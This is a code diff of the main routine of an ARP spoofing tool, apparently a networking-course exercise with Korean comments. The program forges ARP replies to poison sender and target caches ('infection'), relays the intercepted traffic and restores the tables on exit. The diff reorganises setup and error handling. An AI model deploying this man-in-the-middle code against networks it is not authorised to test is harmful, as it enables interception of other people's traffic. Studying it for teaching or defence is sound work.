@@ -1,7 +1,5 @@
 #include "send-arp.h"
 
-
-
 int main(int argc, char* argv[]) {
 	void (*signal_hand)(int);
 	signal_hand = signal(SIGINT, sigint_handler);
@@ -12,30 +10,28 @@ int main(int argc, char* argv[]) {
 		return -1;
 	}
 
-	/*
-	Ip test = 1234;
-	cout << test << endl;
-	return 0;
-	*/
 
-	char* dev = argv[1];
+	char* dev = argv[1];	
+	
+	std::map<Ip, Mac> ARPtable;
+	if(getMyInfo(dev, ARPtable) == FAIL) return -1;
+	
+	Ip me = getMyIp(dev);
+	if ((int)me == FAIL) return -1;
+	
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
 		return -1;
 	}
-	
-	std::map<Ip, Mac> ARPtable;
-	getMyInfo(dev, ARPtable);
-	Ip sender, target;
-	Ip me = getMyIp(dev);
 
-	int now = 2;
 
 	// 전처리를 하자 
 	// resolve를 미리 다 해놓자
 	std::vector <pair<Ip, Ip>> IpTable; // {sender, target}
+	Ip sender, target;
+	int now = 2;
 	while(now < argc) {
 		initArg(&argv[now], sender, target);
 
@@ -52,18 +48,14 @@ int main(int argc, char* argv[]) {
 				now = now + 2;
 				break;
 			}
-
 		}
 
 		if(dup_flag) continue;
 
-
 		IpTable.push_back({sender, target});
-		// sender랑 target Mac 찾기
-		// 휴대폰 화면 꺼져있으면 Mac주소 못찾음..
 
-		if(resolveMac(handle, ARPtable, me, sender) == FAIL) return 0;
-		if(resolveMac(handle, ARPtable, me, target) == FAIL) return 0;
+		if(resolveMac(handle, ARPtable, me, sender) == FAIL) return -1;
+		if(resolveMac(handle, ARPtable, me, target) == FAIL) return -1;
 
 		now = now + 2;
 	}
@@ -77,33 +69,21 @@ int main(int argc, char* argv[]) {
 	cout << "infection start" << endl;
 	#endif
 
+
+
 	// infection 실행
 	for(auto i : IpTable) {
 		infectionPacket.push_back(fillPacket(ARPtable[me], ARPtable[i.first], ARPtable[me], i.second, ARPtable[i.first], i.first, ArpHdr::Reply));
 	}
 	pthread_t t;
-	int rs = pthread_create(&t, NULL, infection, (void*)handle);
+	Pthread_create(&t, NULL, infection, (void*)handle); // assert
 
-
-
-
-
-
-
-	// watchPacket으로
-	// IP 패킷일 경우 => flow로 
-	// ARP 패킷일 경우 => 감염으로 대응해줘야 함
-	// 1초당 1번씩 보내고 있을 때 그닥 걱정은 안됨
-	// 더 큰 주기로 보낸다 했을 때 ARP Table 복구를 염두해야함.
-	// 종료는 ctrl + c로 signal 보내서 가능
-	watchPacket(handle, ARPtable, IpTable, me); // while 조건문 1로 해둠
+	watchPacket(handle, ARPtable, IpTable, me); 
 	
-	#ifdef DEBUG
 	cout << "infection end" << endl;
-	rs = pthread_join(t, NULL);
-	cout << rs << endl;
+	pthread_cancel(t);
+	Pthread_join(t, NULL);
 	cout << "recover start" << endl;
-	#endif
 
 	for(auto i : IpTable) {
 		recover(handle, ARPtable, i.first, i.second);
